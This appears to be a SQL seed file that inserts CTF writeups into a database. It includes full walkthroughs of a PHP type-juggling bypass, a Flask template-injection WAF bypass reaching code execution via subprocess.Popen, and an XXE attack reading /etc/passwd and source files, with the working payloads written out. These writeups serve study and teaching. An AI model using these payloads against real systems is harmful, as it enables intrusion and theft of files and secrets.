die($flag);\n}\n```\n\nNow, we need to find two strings, whose hash when concatenated with a random value are equal. \n\nOne obvious solution is `user==pass`, but the code checks for that. The other problem is that the code uses strict equality checking, which means our earlier `0e` exploits won\'t work. What can we do?\n\nPHP\'s type juggling support not only affects equality, but also concatenation. This is a common feature in other weakly typed languages like JS: \n\n```js\n"hello" + {}; // "hello[object Object]"\n```\n\nIn node/Express web challenges, it is common to pass dictionaries/arrays in HTTP parameters to cause unexpected behavior in applications.\n\nPerhaps we can apply the same technique to PHP?\n\nAfter some googling, I found that we can indeed [pass arrays as parameters](https://stackoverflow.com/a/13389026/11168593) to PHP.\n\nLet\'s see what happens when `$user` and `$pass` are arrays. It turns out in PHP, when an array is concatenated with a string, the result is `"Array" + string`, for example `array("A")+"List"==="ArrayList"`.\n\nWith this knowledge, we are now ready to put all the parts together to execute our attack.\n\n## Putting it together\n\nFrom part 1: \n\n`ticket=SUx1dldIMjAyMQ==`\n\nFrom part 2:\n\n`code1=NOOPCJF`\n\n`code2=0e01010111000111111010101011010111010100`\n\nFrom part 3:\n\n`code3=0e215962017`\n\nFrom part 4:\n\n`username=1&username[]=1`\n\n`pass=0&pass[]=0`\n\nAll together:\n\n`chals.whitehacks.ctf.sg:50201/?ticket=SUx1dldIMjAyMQ==&code1=NOOPCJF&code2=0e01010111000111111010101011010111010100&code3=0e215962017&username=1&username[]=1&pass=0&pass[]=0`\n\n## Comments\n\nThis challenge was something beyond the typical PHP magic hash challenges and I had to think about part 4 for a while. I also learnt about PHP type juggling when dealing with arrays, another technique that will go into my pentesting toolbox.\n');
insert into writeup (challenge_id, poster_username, is_private)
values (23, 'jro', 0);
insert into internal_writeup (internal_writeup_id, body)
values ((select max(writeup_id) from writeup),
        '# WAF Bypass\n\n### burden_bear\n\n**Category: Web**\n\n> Can you get flag from the environment?\n>\n> [chals.whitehacks.ctf.sg:50401](http://chals.whitehacks.ctf.sg:50401/)\n\nAt first, there were no clues on what the challenge was about, though the HTTP headers revealed that the server was `Werkzeug/1.0.1 Python/3.7.10` which is the signature for Flask. After a period without solves, partial source code was released:\n\n```python\n@app.route(\'/\', methods=[\'GET\', \'POST\'])\ndef index():\n    if request.method == \'POST\':\n        payload = request.form[\'quote\']\n    else:\n        payload = "No WAF is a Crime"\n    \n    # WAF REDACTED\n            \n    template = \'\'\'\n    %s\'\'\' % payload\n    quote = render_template_string(template)\n    \n    return quote\n```\n\nNow, it is clear that the app is vulnerable to [flask template injection](https://akshukatkar.medium.com/rce-with-flask-jinja-template-injection-ea5d0201b870) through the `quote` HTTP parameter. Usually, templates are used to insert some data into the HTML response. They can also be used to perform operations on the data, like concatenation. For example, sending `{{ 1-1 }}` returns `0`. This requires code within the template to be executed. Thus, we can use this to leak the flag through remote code execution. \n\nHowever, there is some kind of blacklist or firewall, as hinted by the title WAF. For example, attempting to read `/proc/self/environ` returns `illegal`. In general, to get past most python jails/blacklists, we try to obtain a list of subclasses of the base class `<type \'object\'>`, ie all classes currently loaded in the system. \n\n```python\n{{ "".__class__.__base__.__subclasses__() }}\n```\n\nThis list a bunch of classes, but we\'re most interested in the [`<class \'subprocess.Popen\'>` class]([subprocess  Subprocess management  Python 3.9.2 documentation](https://docs.python.org/3/library/subprocess.html#subprocess.Popen)) which allows us to execute shell commands. We find that it\'s at index 425 in the list. Because the challenge description references an \'environment\', we look at the environment variables:\n\n```python\n{{ "".__class__.__base__.__subclasses__()[425](["env"], stdout=-1).communicate() }}\n```\n\nFlag: `WH2021{simple_ssti_bypass_is_so_simple_that_you_dont_need_a_brain_hahahahaha_SG-BTBLP}`\n\n');
insert into writeup (challenge_id, poster_username, is_private)
values (24, 'jro', 0);
insert into internal_writeup (internal_writeup_id, body)
values ((select max(writeup_id) from writeup),
        '# X marks Louis\'s treasure\n\n### burden_bear\n\n**Category: Web**\n\n> Finding a web page that leads to Louis\' hidden treasure on his server HEHEHEHE\n>\n>  [chals.whitehacks.ctf.sg:50101](http://chals.whitehacks.ctf.sg:50101/)\n\nThe login page hints at some kind of SQL injection attack, but basic attacks don\'t seem to yield any results. Looking at the source code, we find a HTML comment: \n\n```html\n<!-- Or is it here in <img src="./cc665cc8baf65ba4f4b28dafdc3cf5a7/da4446ea44be23905b233381e45dd1f1/"-->\n```\n\nAccessing that link and inspecting element again yields another comment:\n\n```html\n<!--<a href="../secret.html"></a>-->\n```\n\nSecret.html contains yet another comment:\n\n```html\n<!--Wanna see more? Figure out where you should go? be a DIR-ean LISTer-->\n```\n\nI figured the challenge required listing the `./cc665cc8baf65ba4f4b28dafdc3cf5a7` directory, so I let [`dirb`](https://tools.kali.org/web-applications/dirb) run on the URL while looking at other challenges. However I later realized that directory listings were enabled on `./cc665cc8baf65ba4f4b28dafdc3cf5a7` so using dirb was unnecessary. \n\nViewing the directory listing reveals a few interesting files:\n\n- `upload.php`\n- `uploads/user.xml`\n\n`upload.php` features a file upload form, while `user.xml` has the following contents:\n\n```xml\n<root>\n    <username>l0j0</username>\n    <password>super_secr3t</password>\n</root>\n```\n\nIt is thus likely that this app is vulnerable to [XXE](https://portswigger.net/web-security/xxe). To verify this, we can try reading `/etc/passwd`\n\n```xml-dtd\n<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>\n<root>\n    <username>l0j0</username>\n    <password>&xxe;</password>\n</root>\n```\n\nGreat! A list of users is returned in the password field.\n\nNow, we can try changing the file path to obtain the flag. However, this error is returned: `failed to load external entity "file:///flag.txt" in **/var/www/app/cc665cc8baf65ba4f4b28dafdc3cf5a7/upload.php** on line **15**`. We can try to read the source code of `upload.php` for some clues. However, we cannot simply read the code as it will be executed by the PHP engine when it is injected into the page, so we have to encode it. Fortunately,  we can use the `php://filter` feature to encode files for us. \n\n```xml-dtd\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/app/cc665cc8baf65ba4f4b28dafdc3cf5a7/upload.php"> ]>\n```\n\nDecoding the base64, we find the following comment:\n\n```html\n<!-- You won\'t believe it, but the flag is in /home/l0j0/flag.txt - you\'ll never get it though! -->\n```\n\nNote: This comment can also be found by HTML inspecting the page :<\n\nSetting the XXE path to `/home/l0j0/flag.txt` reveals the flag: `WH2021{th3_sup3r_s3cr3t_tr34sur3!}`\n\n');
insert into writeup (challenge_id, poster_username, is_private)
values (12, 'jro', 0);
insert into external_writeup (external_writeup_id, url)
values ((select max(writeup_id)
         from writeup), 'https://spicy-walnut-eb5.notion.site/badseed-bed855a7518a4d5a83333be2fb681ebf');
insert into writeup (challenge_id, poster_username, is_private)
values (12, 'jro', 0);
insert into external_writeup (external_writeup_id, url)
values ((select max(writeup_id)
         from writeup), 'https://github.com/ryan-cd/ctf/tree/master/2021/k3rn3l4my/bad_seed');
insert into writeup (challenge_id, poster_username, is_private)
values (13, 'jro', 0);
insert into external_writeup (external_writeup_id, url)
values ((select max(writeup_id)
         from writeup), 'https://volticks.github.io/Gradebook-writeup/');
insert into writeup (challenge_id, poster_username, is_private)
values (1, 'jro', 0);
insert into external_writeup (external_writeup_id, url)
values ((select max(writeup_id)
         from writeup), 'https://github.com/badsudo/ctf-writeups/tree/main/BackdoorCTF%202021/BabyHeap');
insert into writeup (challenge_id, poster_username, is_private)
values (4, 'jro', 0);
insert into external_writeup (external_writeup_id, url)
values ((select max(writeup_id)
         from writeup), 'https://spicy-walnut-eb5.notion.site/phpme-e0fce750ec8a4874b660a293db1754c5');
insert into writeup (challenge_id, poster_username, is_private)
values (4, 'jro', 0);
insert into external_writeup (external_writeup_id, url)
values ((select max(writeup_id)
         from writeup), 'https://ctftime.org/writeup/29924');
insert into writeup (challenge_id, poster_username, is_private)
values (16, 'jro', 0);
insert into external_writeup (external_writeup_id, url)
values ((select max(writeup_id)
         from writeup), 'https://qiita.com/kusano_k/items/8a63b97d1427ef2e3369#json');
insert into writeup (challenge_id, poster_username, is_private)
values (14, 'jro', 0);
insert into external_writeup (external_writeup_id, url)
values ((select max(writeup_id)
         from writeup), 'https://qiita.com/kusano_k/items/8a63b97d1427ef2e3369#json');
insert into writeup (challenge_id, poster_username, is_private)
values (17, 'jro', 0);
insert into external_writeup (external_writeup_id, url)
values ((select max(writeup_id)
         from writeup), 'https://qiita.com/kusano_k/items/8a63b97d1427ef2e3369#json');
insert into writeup (challenge_id, poster_username, is_private)
values (15, 'jro', 0);
insert into external_writeup (external_writeup_id, url)
values ((select max(writeup_id)
         from writeup), 'https://qiita.com/kusano_k/items/8a63b97d1427ef2e3369#json');

